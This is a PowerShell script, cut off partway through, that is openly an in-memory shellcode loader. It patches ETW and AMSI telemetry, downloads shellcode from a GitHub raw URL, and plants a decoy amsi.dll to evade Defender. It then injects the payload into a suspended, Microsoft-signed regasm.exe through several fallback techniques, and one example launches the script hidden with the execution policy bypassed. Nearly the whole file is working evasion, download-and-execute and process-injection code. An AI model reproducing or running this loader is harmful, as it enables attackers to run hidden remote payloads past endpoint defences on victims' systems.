<#
.SYNOPSIS
    regasm-loader.ps1 - ETW/AMSI-patched, in-memory shellcode loader with
    suspended regasm.exe host, post-injection health telemetry and automatic
    technique fallback.

.DESCRIPTION
    Pipeline:
      1. Patch ETW (and optionally AMSI) in the current process.
      2. Fetch shellcode over HTTPS into memory only (no disk artifact).
      3. Optionally XOR-obfuscate the blob while resident in the loader process.
      4. Spawn regasm.exe (Microsoft-signed .NET Framework host) CREATE_SUSPENDED.
      5. Patch ntdll!EtwEventWrite* inside the suspended host before its first
         instruction executes.
      6. Write shellcode into a RW allocation, flip to RX, execute via one of
         four injection primitives.
      7. Monitor the host for N seconds: process liveness, exit code, page
         state and byte-integrity of the injected region. Any deviation
         (crash / wipe / guard-page flip) is recorded and the next technique
         is attempted automatically until a stable run is observed.

.PARAMETER ShellcodeUrl
    Raw shellcode over HTTPS. Defaults to the supplied far end.

.PARAMETER ShellcodePath
    Local raw shellcode file, for offline lab work. Overrides -ShellcodeUrl.

.PARAMETER HostExe
    Host binary. Default: auto-resolved regasm.exe (64-bit CLR preferred).

.PARAMETER HostArguments
    Command line tail for the host.

.PARAMETER Method
    Auto | Hijack | RemoteThread | Apc | CreateRemoteThread

.PARAMETER MonitorSeconds
    Health observation window per attempt (default 10).

.PARAMETER MaxAttempts
    Technique cycles before giving up (default 12).

.PARAMETER NoEtw
    Skip the ETW patch (local and remote).

.PARAMETER NoDecoy
    Skip the decoy host stage. Off by default because it is what keeps the run
    alive: the host is copied to a staging directory with a decoy amsi.dll
    beside it, so the payload's startup AMSI patch resolves the decoy instead of
    the real module that hosts Defender's provider. Without it, Defender
    terminates the host for Behavior:Win32/AMSI_Patch_T.B12.

.PARAMETER Amsi
    Also patch AmsiScanBuffer / AmsiScanString locally. Off by default: in
    PowerShell 5.1 the AMSI client re-scans commands and a patched provider can
    make the host abandon its pipeline, which looks exactly like a crash. Enable
    it only when this script is itself the stage-2 payload.

.PARAMETER NoEncrypt
    Keep the blob in plaintext in this process instead of XOR-masking it.

.PARAMETER WarmupSeconds
    Stage the payload encrypted in a RW (non-executable) region, hold for N
    seconds, then decrypt in place and flip to RX. Defeats scanners that sweep a
    process on creation; does NOT help when the detection is behavioural or
    content-based, because the plaintext is still present when it executes.

.PARAMETER NoHoldMain
    RemoteThread technique: resume the host's main thread as well (default is to
    leave it suspended so the host cannot return from its entry point).

.PARAMETER KeepHostOnFail
    Leave a failed attempt's host process alive for inspection instead of
    terminating it.

.PARAMETER NoInject
    Diagnostic: spawn, patch and map the payload, then monitor without ever
    transferring control. Isolates loader problems from payload problems.

.PARAMETER DryRun
    Exercise the pipeline with a synthetic buffer and terminate the host before
    any payload executes. No network, no execution, no detection surface.

.EXAMPLE
    powershell -nop -w hidden -ep bypass -f .\regasm-loader.ps1

.EXAMPLE
    .\regasm-loader.ps1 -Method Hijack -MonitorSeconds 15

.EXAMPLE
    .\regasm-loader.ps1 -ShellcodePath .\payload.bin -NoEtw -MonitorSeconds 30

.EXAMPLE
    .\regasm-loader.ps1 -DryRun
#>

[CmdletBinding()]
param(
    [string]  $ShellcodeUrl    = 'https://github.com/i25968627-ui/verbose-potato/raw/refs/heads/main/loader.bin',
    [string]  $ShellcodePath   = '',
    [string]  $HostExe         = '',
    [string]  $HostArguments   = '/nologo',
    [ValidateSet('Auto', 'Hijack', 'RemoteThread', 'Apc', 'CreateRemoteThread')]
    [string]  $Method          = 'Auto',
    [int]     $MonitorSeconds  = 10,
    [int]     $PollMs          = 200,
    [int]     $MaxAttempts     = 12,
    [int]     $RetryDelayMs    = 750,
    [int]     $WarmupSeconds  = 0,
    [switch]  $NoEtw,
    [switch]  $NoDecoy,
    [switch]  $Amsi,
    [switch]  $NoEncrypt,
    [switch]  $NoHoldMain,
    [switch]  $KeepHostOnFail,
    [switch]  $DryRun,
    [switch]  $NoInject
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version 2.0

# ---------------------------------------------------------------------------
#  Telemetry
# ---------------------------------------------------------------------------

$script:Clock = [System.Diagnostics.Stopwatch]::StartNew()
$script:Step  = 0

function Write-V {
    param(
        [Parameter(Mandatory)][string]$Text,
        [ValidateSet('*', '+', '-', '!', '>', '=')] [string]$Sigil = '*',
        [ConsoleColor]$Color = 'Gray'
    )
    $script:Step++
    $ts = [DateTime]::Now.ToString('HH:mm:ss.fff')
    $line = '{0}  [{1}] {2}' -f $ts, $script:Step.ToString('000'), $Text
    if ($Sigil -eq '*') { Write-Host ('  {0} ' -f $Sigil) -NoNewline -ForegroundColor DarkCyan }
    elseif ($Sigil -eq '+') { Write-Host ('  {0} ' -f $Sigil) -NoNewline -ForegroundColor Green }
    elseif ($Sigil -eq '-') { Write-Host ('  {0} ' -f $Sigil) -NoNewline -ForegroundColor Red }
    elseif ($Sigil -eq '!') { Write-Host ('  {0} ' -f $Sigil) -NoNewline -ForegroundColor Yellow }
    elseif ($Sigil -eq '>') { Write-Host ('  {0} ' -f $Sigil) -NoNewline -ForegroundColor Magenta }
    else { Write-Host ('  {0} ' -f $Sigil) -NoNewline -ForegroundColor DarkGray }
    Write-Host $line -ForegroundColor $Color
}

function Write-Banner {
    Write-Host ''
    Write-Host '  +--------------------------------------------------------------+' -ForegroundColor DarkCyan
    Write-Host '  |  regasm-loader  ::  ETW-patched in-memory shellcode loader    |' -ForegroundColor Cyan
    Write-Host '  |  host : regasm.exe (signed .NET Framework COM registrar)      |' -ForegroundColor DarkCyan
    Write-Host '  +--------------------------------------------------------------+' -ForegroundColor DarkCyan
    Write-Host ''
}

# ---------------------------------------------------------------------------
#  Native layer
# ---------------------------------------------------------------------------

if (-not ('RT' -as [type])) {
    $src = @'
using System;
using System.Text;
using System.Runtime.InteropServices;

public static class RT
{
    public const uint CREATE_SUSPENDED        = 0x00000004;
    public const uint CREATE_NO_WINDOW        = 0x08000000;
    public const uint CREATE_BREAKAWAY_FROM_JOB = 0x01000000;

    public const uint MEM_COMMIT              = 0x00001000;
    public const uint MEM_RESERVE             = 0x00002000;
    public const uint MEM_RELEASE             = 0x00008000;
    public const uint PAGE_READWRITE          = 0x04;
    public const uint PAGE_EXECUTE_READ       = 0x20;
    public const uint PAGE_EXECUTE_READWRITE  = 0x40;
    public const uint PAGE_GUARD              = 0x100;
    public const uint PAGE_NOACCESS           = 0x01;

    public const uint PROCESS_ALL_ACCESS      = 0x1F0FFF;
    public const uint THREAD_ALL_ACCESS       = 0x1FFFFF;
    public const uint STILL_ACTIVE            = 259;

    public const uint CONTEXT_AMD64           = 0x00100000;
    public const uint CONTEXT_CONTROL         = CONTEXT_AMD64 | 0x1;
    public const uint CONTEXT_INTEGER         = CONTEXT_AMD64 | 0x2;
    public const uint CONTEXT_FULL            = CONTEXT_AMD64 | 0x7;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public int    cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int    dwX;
        public int    dwY;
        public int    dwXSize;
        public int    dwYSize;
        public int    dwXCountChars;
        public int    dwYCountChars;
        public int    dwFillAttribute;
        public int    dwFlags;
        public short  wShowWindow;
        public short  cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int    dwProcessId;
        public int    dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint   AllocationProtect;
        public uint   PartitionIdAndPad;
        public IntPtr RegionSize;
        public uint   State;
        public uint   Protect;
        public uint   Type;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct CONTEXT
    {
        public ulong  P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint   ContextFlags;
        public uint   MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint   EFlags;
        public ulong  Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong  Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong  R8, R9, R10, R11, R12, R13, R14, R15, Rip;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 976)]
        public byte[] Trailing;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateThreadExDelegate(
        out IntPtr hThread, uint desiredAccess, IntPtr objectAttributes,
        IntPtr hProcess, IntPtr startRoutine, IntPtr argument,
        uint createFlags, IntPtr zeroBits, IntPtr stackSize,
        IntPtr maximumStackSize, IntPtr attributeList);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.LPStr)] string name);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, [MarshalAs(UnmanagedType.LPStr)] string name);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProc, IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, UIntPtr size, uint allocType, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFreeEx(IntPtr hProc, IntPtr addr, UIntPtr size, uint freeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, byte[] buffer, UIntPtr size, out UIntPtr written);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProc, IntPtr addr, byte[] buffer, UIntPtr size, out UIntPtr read);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool FlushInstructionCache(IntPtr hProc, IntPtr addr, UIntPtr size);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(uint access, bool inherit, uint tid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool QueueUserAPC(IntPtr pfnApc, IntPtr hThread, UIntPtr data);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool TerminateProcess(IntPtr hProc, uint exitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attrs, UIntPtr stackSize,
                                                   IntPtr start, IntPtr param, uint flags, out uint tid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetExitCodeProcess(IntPtr hProc, out uint code);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, IntPtr ctx);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, IntPtr ctx);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualQueryEx(IntPtr hProc, IntPtr addr,
                                               out MEMORY_BASIC_INFORMATION mbi, UIntPtr length);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(string appName, StringBuilder cmdLine,
                                             IntPtr procAttrs, IntPtr threadAttrs, bool inherit,
                                             uint flags, IntPtr env, string cwd,
                                             ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    // ---------------------------------------------------------------- helpers

    public static bool PatchLocal(IntPtr addr, byte[] data, out string note)
    {
        note = "";
        uint old;
        if (!VirtualProtect(addr, (UIntPtr)data.Length, PAGE_EXECUTE_READWRITE, out old))
        { note = "VirtualProtect failed " + Marshal.GetLastWin32Error(); return false; }
        Marshal.Copy(data, 0, addr, data.Length);
        FlushInstructionCache(ProcessPseudoHandle, addr, (UIntPtr)data.Length);
        uint ignored;
        VirtualProtect(addr, (UIntPtr)data.Length, old, out ignored);
        return true;
    }

    public static IntPtr ProcessPseudoHandle { get { return new IntPtr(-1); } }

    public static bool PatchRemote(IntPtr hProc, IntPtr addr, byte[] data)
    {
        uint old;
        if (!VirtualProtectEx(hProc, addr, (UIntPtr)data.Length, PAGE_EXECUTE_READWRITE, out old)) return false;
        UIntPtr written;
        if (!WriteProcessMemory(hProc, addr, data, (UIntPtr)data.Length, out written)) return false;
        FlushInstructionCache(hProc, addr, (UIntPtr)data.Length);
        uint ignored;
        VirtualProtectEx(hProc, addr, (UIntPtr)data.Length, old, out ignored);
        return true;
    }

    public static IntPtr AllocRemote(IntPtr hProc, byte[] data, out IntPtr baseAddr)
    {
        baseAddr = VirtualAllocEx(hProc, IntPtr.Zero, (UIntPtr)data.Length,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero) return IntPtr.Zero;
        UIntPtr written;
        if (!WriteProcessMemory(hProc, baseAddr, data, (UIntPtr)data.Length, out written)) return IntPtr.Zero;
        uint old;
        if (!VirtualProtectEx(hProc, baseAddr, (UIntPtr)data.Length, PAGE_EXECUTE_READ, out old)) return IntPtr.Zero;
        FlushInstructionCache(hProc, baseAddr, (UIntPtr)data.Length);
        return baseAddr;
    }

    // Stage an encrypted blob: committed and writable, but NOT executable.
    public static IntPtr AllocRemoteRaw(IntPtr hProc, byte[] data, out IntPtr baseAddr)
    {
        baseAddr = VirtualAllocEx(hProc, IntPtr.Zero, (UIntPtr)data.Length,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero) return IntPtr.Zero;
        UIntPtr written;
        if (!WriteProcessMemory(hProc, baseAddr, data, (UIntPtr)data.Length, out written)) return IntPtr.Zero;
        return baseAddr;
    }

    public static bool WriteRemote(IntPtr hProc, IntPtr addr, byte[] data)
    {
        UIntPtr written;
        if (!WriteProcessMemory(hProc, addr, data, (UIntPtr)data.Length, out written)) return false;
        FlushInstructionCache(hProc, addr, (UIntPtr)data.Length);
        return true;
    }

    public static bool ProtectRemote(IntPtr hProc, IntPtr addr, int len, uint prot)
    {
        uint old;
        return VirtualProtectEx(hProc, addr, (UIntPtr)len, prot, out old);
    }

    public static bool ReadRemote(IntPtr hProc, IntPtr addr, int len, out byte[] data)
    {
        data = new byte[len];
        UIntPtr read;
        return ReadProcessMemory(hProc, addr, data, (UIntPtr)len, out read);
    }

    public static bool QueryRemote(IntPtr hProc, IntPtr addr, out uint state, out uint protect)
    {
        MEMORY_BASIC_INFORMATION mbi;
        state = 0; protect = 0;
        IntPtr r = VirtualQueryEx(hProc, addr, out mbi, (UIntPtr)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
        if (r == IntPtr.Zero) return false;
        state = mbi.State; protect = mbi.Protect;
        return true;
    }

    public static bool RvaOf(IntPtr localBase, string fn, out ulong rva)
    {
        rva = 0;
        IntPtr p = GetProcAddress(localBase, fn);
        if (p == IntPtr.Zero) return false;
        rva = (ulong)(p.ToInt64() - localBase.ToInt64());
        return true;
    }

    public static bool IsMappedImageAt(IntPtr hProc, IntPtr addr)
    {
        uint state, protect;
        if (!QueryRemote(hProc, addr, out state, out protect)) return false;
        if (state != MEM_COMMIT) return false;
        byte[] mz;
        if (!ReadRemote(hProc, addr, 2, out mz)) return false;
        return mz[0] == 0x4D && mz[1] == 0x5A;
    }
}
'@
    try {
        Add-Type -TypeDefinition $src -Language CSharp -ErrorAction Stop
    }
    catch {
        Write-Host ''
        Write-Host '  [-] C# runtime compilation failed:' -ForegroundColor Red
        Write-Host ('      ' + $_.Exception.Message) -ForegroundColor DarkRed
        throw
    }
}

Add-Type -AssemblyName System.Core -ErrorAction SilentlyContinue

# ---------------------------------------------------------------------------
#  Stage 1 - local process hardening
# ---------------------------------------------------------------------------

function Disable-EtwLocal {
    $ntdll = [RT]::GetModuleHandleA('ntdll.dll')
    if ($ntdll -eq [IntPtr]::Zero) { Write-V 'ntdll handle null, ETW patch skipped' '!' 'Yellow'; return }
    Write-V ('ntdll!  base = 0x{0:X}' -f $ntdll.ToInt64())

    $targets = @('EtwEventWrite', 'EtwEventWriteEx', 'EtwEventWriteFull', 'EtwEventWriteString', 'EtwEventWriteTransfer')
    $patched = 0
    foreach ($fn in $targets) {
        $addr = [RT]::GetProcAddress($ntdll, $fn)
        if ($addr -eq [IntPtr]::Zero) { Write-V ("{0,-22} not exported / absent" -f $fn) '=' 'DarkGray'; continue }
        $first = [System.Runtime.InteropServices.Marshal]::ReadByte($addr)
        if ($first -eq 0x33) { Write-V ("{0,-22} already patched @ 0x{1:X}" -f $fn, $addr.ToInt64()) '=' 'DarkGray'; $patched++; continue }
        # xor eax,eax ; ret  -> event write returns STATUS_SUCCESS, no telemetry emitted
        $bytes = [byte[]](0x33, 0xC0, 0xC3)
        $note = ''
        $ok = [RT]::PatchLocal($addr, $bytes, [ref]$note)
        if ($ok) {
            Write-V ("{0,-22} patched @ 0x{1:X}  ->  33 C0 C3" -f $fn, $addr.ToInt64()) '+' 'Green'
            $patched++
        } else {
            Write-V ("{0,-22} patch failed: {1}" -f $fn, $note) '-' 'Red'
        }
    }
    Write-V ('ETW providers neutralised: {0}' -f $patched) '+' 'Green'
}

function Disable-AmsiLocal {
    $amsi = [RT]::GetModuleHandleA('amsi.dll')
    if ($amsi -eq [IntPtr]::Zero) {
        Write-V 'amsi.dll not resident in this process - nothing to patch' '=' 'DarkGray'
        return
    }

    # A stub that returns early WITHOUT writing AMSI_RESULT_CLEAN to the out
    # pointer leaves the caller reading uninitialised memory. PowerShell then
    # intermittently observes AMSI_RESULT_DETECTED, abandons the pipeline and the
    # process exits silently. Correct stub per entry point:
    #   mov rax,[rsp+RESULT]        ; AMSI_RESULT* (last stack argument)
    #   mov dword ptr [rax],0       ; AMSI_RESULT_CLEAN
    #   xor eax,eax                 ; S_OK
    #   ret
    $stubs = @(
        @{ Name = 'AmsiScanBuffer'; Off = 0x30 },
        @{ Name = 'AmsiScanString'; Off = 0x28 }
    )

    foreach ($s in $stubs) {
        $addr = [RT]::GetProcAddress($amsi, $s.Name)
        if ($addr -eq [IntPtr]::Zero) { Write-V ("{0} export not found" -f $s.Name) '!' 'Yellow'; continue }

        $b0 = [System.Runtime.InteropServices.Marshal]::ReadByte($addr)
        $b1 = [System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]([long]$addr.ToInt64() + 1))
        $b2 = [System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]([long]$addr.ToInt64() + 2))
        if ($b0 -eq 0x48 -and $b1 -eq 0x8B -and $b2 -eq 0x44) {
            Write-V ("{0,-16} already patched" -f $s.Name) '=' 'DarkGray'
            continue
        }

        $bytes = [byte[]](0x48, 0x8B, 0x44, 0x24, $s.Off, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xC0, 0xC3)
        $note = ''
        if ([RT]::PatchLocal($addr, $bytes, [ref]$note)) {
            Write-V ('{0,-16} patched @ 0x{1:X}  ->  CLEAN result + S_OK (result ptr +0x{2:X})' -f $s.Name, $addr.ToInt64(), $s.Off) '+' 'Green'
        } else {
            Write-V ('{0,-16} patch failed: {1}' -f $s.Name, $note) '-' 'Red'
        }
    }
}

# ---------------------------------------------------------------------------
#  Stage 2 - payload acquisition
# ---------------------------------------------------------------------------

function Get-ShellcodeBytes {
    if ($ShellcodePath) {
        if (-not (Test-Path -LiteralPath $ShellcodePath)) { throw "shellcode file not found: $ShellcodePath" }
        Write-V ('source: local file {0}' -f $ShellcodePath)
        return [System.IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $ShellcodePath).Path)
    }

    Write-V ('source: {0}' -f $ShellcodeUrl)
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
    try { [Net.ServicePointManager]::Expect100Continue = $false } catch { }

    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    $err = $null

    # 1) WebClient - follows redirects, byte-clean, no disk touch
    try {
        $wc = New-Object Net.WebClient
        $wc.Headers.Add('User-Agent', $ua)
        $wc.Headers.Add('Accept', '*/*')
        $wc.Headers.Add('Accept-Language', 'en-US,en;q=0.9')
        $bytes = $wc.DownloadData($ShellcodeUrl)
        $wc.Dispose()
        if ($bytes -and $bytes.Length -gt 0) { Write-V 'transport: WebClient' '=' 'DarkGray'; return $bytes }
    }
    catch { $err = $_.Exception.Message; Write-V ('WebClient path failed: ' + $err) '!' 'Yellow' }

    # 2) HttpClient (assembly is not loaded by default on PowerShell 5.1)
    try {
        try { Add-Type -AssemblyName System.Net.Http -ErrorAction Stop } catch { }
        $h = New-Object System.Net.Http.HttpClient
        $h.DefaultRequestHeaders.Add('User-Agent', $ua)
        $h.Timeout = [TimeSpan]::FromSeconds(45)
        $bytes = $h.GetByteArrayAsync($ShellcodeUrl).GetAwaiter().GetResult()
        $h.Dispose()
        if ($bytes -and $bytes.Length -gt 0) { Write-V 'transport: HttpClient' '=' 'DarkGray'; return $bytes }
    }
    catch { $err = $_.Exception.Message; Write-V ('HttpClient path failed: ' + $err) '!' 'Yellow' }

    # 3) Invoke-WebRequest
    try {
        $ProgressPreference = 'SilentlyContinue'
        $r = Invoke-WebRequest -Uri $ShellcodeUrl -UseBasicParsing -TimeoutSec 45 -Headers @{ 'User-Agent' = $ua }
        if ($r.PSObject.Properties['RawContentStream'] -and $r.RawContentStream) {
            $bytes = $r.RawContentStream.ToArray()
        } else {
            $bytes = $r.Content
            if ($bytes -is [string]) { $bytes = [Text.Encoding]::GetEncoding(28591).GetBytes($bytes) }
        }
        if ($bytes -and $bytes.Length -gt 0) { Write-V 'transport: Invoke-WebRequest' '=' 'DarkGray'; return $bytes }
    }
    catch { $err = $_.Exception.Message; Write-V ('IWR path failed: ' + $err) '!' 'Yellow' }

    throw "all download transports failed; last error: $err"
}

function New-XorBlob {
    param([byte[]]$Data)
    $key = [byte[]]::new(32)
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($key)
    $rng.Dispose()
    $out = [byte[]]::new($Data.Length)
    for ($i = 0; $i -lt $Data.Length; $i++) { $out[$i] = $Data[$i] -bxor $key[$i % 32] }
    return @{ Data = $out; Key = $key }
}

function Un-XorBlob {
    param([byte[]]$Data, [byte[]]$Key)
    $out = [byte[]]::new($Data.Length)
    for ($i = 0; $i -lt $Data.Length; $i++) { $out[$i] = $Data[$i] -bxor $Key[$i % 32] }
    return $out
}

function Get-BlobProfile {
    param([byte[]]$Data)
    $mz = ($Data.Length -gt 1 -and $Data[0] -eq 0x4D -and $Data[1] -eq 0x5A)
    $pe = $false
    if ($mz -and $Data.Length -gt 0x40) {
        $off = [BitConverter]::ToInt32($Data, 0x3C)
        if ($off -gt 0 -and ($off + 4) -lt $Data.Length) {
            $pe = ($Data[$off] -eq 0x50 -and $Data[$off + 1] -eq 0x45)
        }
    }
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = ($sha.ComputeHash($Data) | ForEach-Object { $_.ToString('x2') }) -join ''
    $sha.Dispose()
    [pscustomobject]@{
        Length = $Data.Length
        Sha256 = $hash
        IsPE   = $pe
        IsMZ   = $mz
        Head   = (($Data[0..7] | ForEach-Object { $_.ToString('x2') }) -join ' ')
    }
}

# ---------------------------------------------------------------------------
#  Stage 3 - host process
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
#  Decoy host
# ---------------------------------------------------------------------------
# Getting killed by Behavior:Win32/AMSI_Patch_T.B12 has nothing to do with the
# shellcode: the payload patches amsi!AmsiScanBuffer at startup, Defender's
# in-process provider notices its own code was modified and terminates the host.
# That rule fires on the loader's own patch too, so patching first is not an
# option - the patch simply must not land on amsi.dll.
#
# amsi.dll is not in KnownDLLs, so the application directory wins the loader's
# module search. Running a copy of the host from a directory we control, with a
# decoy amsi.dll beside it, means the payload resolves the decoy, patches that,
# and the real provider is never touched. AMSI was never active in that process
# anyway, so nothing is lost by it.

function Initialize-DecoyHost {
    param([string]$SourceExe)

    if ($NoDecoy) { return $SourceExe }

    $root = $PSScriptRoot
    if (-not $root -or -not (Test-Path -LiteralPath $root)) { $root = $env:TEMP }

    # prune stages left behind by earlier runs (a live host keeps its own stage
    # locked, so removal is best effort and only for stale directories)
    Get-ChildItem -LiteralPath $root -Directory -Filter 'stage-*' -ErrorAction SilentlyContinue |
        Where-Object { $_.LastWriteTime -lt (Get-Date).AddMinutes(-30) } |
        ForEach-Object { try { Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction Stop } catch { } }

    $stage = Join-Path $root ('stage-' + [Guid]::NewGuid().ToString('N').Substring(0, 8))
    New-Item -ItemType Directory -Path $stage -Force | Out-Null
    $script:StageDir = $stage

    $leaf = Split-Path -Parent $SourceExe
    $exeName = Split-Path -Leaf $SourceExe
    $hostCopy = Join-Path $stage $exeName
    Copy-Item -LiteralPath $SourceExe -Destination $hostCopy -Force

    # anything the host needs next to itself in its own framework folder
    foreach ($side in 'config', 'manifest') {
        $candidate = Join-Path $leaf ($exeName + '.' + $side)
        if (Test-Path -LiteralPath $candidate) {
            Copy-Item -LiteralPath $candidate -Destination (Join-Path $stage ($exeName + '.' + $side)) -Force
        }
    }

    $sysAmsi = Join-Path $env:WINDIR 'System32\amsi.dll'
    $decoy = Join-Path $stage 'amsi.dll'
    if (Test-Path -LiteralPath $sysAmsi) {
        try {
            Copy-Item -LiteralPath $sysAmsi -Destination $decoy -Force
            Write-V ('decoy amsi.dll planted beside host ({0} bytes)' -f (Get-Item -LiteralPath $decoy).Length) '+' 'Green'
        }
        catch {
            Write-V ('decoy amsi.dll could not be written: ' + $_.Exception.Message) '-' 'Red'
        }
    }
    else {
        Write-V 'system amsi.dll not found - decoy skipped' '!' 'Yellow'
    }

    Write-V ('decoy host staged: {0}' -f $hostCopy) '+' 'Green'
    return $hostCopy
}

function Resolve-RedTeamHost {    if ($HostExe) {
        if (-not (Test-Path -LiteralPath $HostExe)) { throw "host binary not found: $HostExe" }
        return (Resolve-Path -LiteralPath $HostExe).Path
    }
    $roots = @()
    if ([Environment]::Is64BitProcess) {
        $roots += 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe'
        $roots += 'C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe'
    }
    $roots += 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe'
    $roots += 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe'
    foreach ($p in $roots) {
        if (Test-Path -LiteralPath $p) { return $p }
    }
    throw 'regasm.exe not found on this system'
}

function Start-SuspendedHost {
    param([string]$Exe, [string]$Arguments)

    $si = New-Object RT+STARTUPINFO
    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([type][RT+STARTUPINFO])
    $si.dwFlags = 0x1                        # STARTF_USESHOWWINDOW
    $si.wShowWindow = 0                      # SW_HIDE
    $pi = New-Object RT+PROCESS_INFORMATION

    $cmd = '"{0}" {1}' -f $Exe, $Arguments
    $sb = New-Object System.Text.StringBuilder($cmd)
    $workDir = Split-Path -Parent $Exe
    if (-not $workDir -or -not (Test-Path -LiteralPath $workDir)) { $workDir = $env:WINDIR }

    $flagSets = @(
        ([RT]::CREATE_SUSPENDED -bor [RT]::CREATE_NO_WINDOW -bor [RT]::CREATE_BREAKAWAY_FROM_JOB),
        ([RT]::CREATE_SUSPENDED -bor [RT]::CREATE_NO_WINDOW)
    )

    $ok = $false
    foreach ($flags in $flagSets) {
        $pi = New-Object RT+PROCESS_INFORMATION
        $ok = [RT]::CreateProcessW($Exe, $sb, [IntPtr]::Zero, [IntPtr]::Zero, $false,
                                   $flags, [IntPtr]::Zero, $workDir, [ref]$si, [ref]$pi)
        if ($ok) { break }
        $e = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-V ('CreateProcess flags 0x{0:X} -> {1}' -f $flags, $e) '!' 'Yellow'
    }
    if (-not $ok) { throw ('CreateProcessW failed, win32=' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()) }

    Write-V ('host spawned  pid={0}  tid={1}  suspended' -f $pi.dwProcessId, $pi.dwThreadId) '+' 'Green'
    return $pi
}

function Disable-EtwRemote {
    param([IntPtr]$hProcess)
    $localNtdll = [RT]::GetModuleHandleA('ntdll.dll')
    if ($localNtdll -eq [IntPtr]::Zero) { return }

    # ntdll is mapped at a boot-stable base shared by every process in the session;
    # validate before writing so a divergent mapping can never corrupt the host.
    if (-not [RT]::IsMappedImageAt($hProcess, $localNtdll)) {
        Write-V 'remote ntdll base mismatch - ETW patch skipped for host' '!' 'Yellow'
        return
    }
    Write-V ('remote ntdll base verified @ 0x{0:X}' -f $localNtdll.ToInt64()) '=' 'DarkGray'

    $targets = @('EtwEventWrite', 'EtwEventWriteEx', 'EtwEventWriteFull', 'EtwEventWriteString', 'EtwEventWriteTransfer')
    $bytes = [byte[]](0x33, 0xC0, 0xC3)
    $n = 0
    foreach ($fn in $targets) {
        [uint64]$rva = 0
        if (-not [RT]::RvaOf($localNtdll, $fn, [ref]$rva)) { continue }
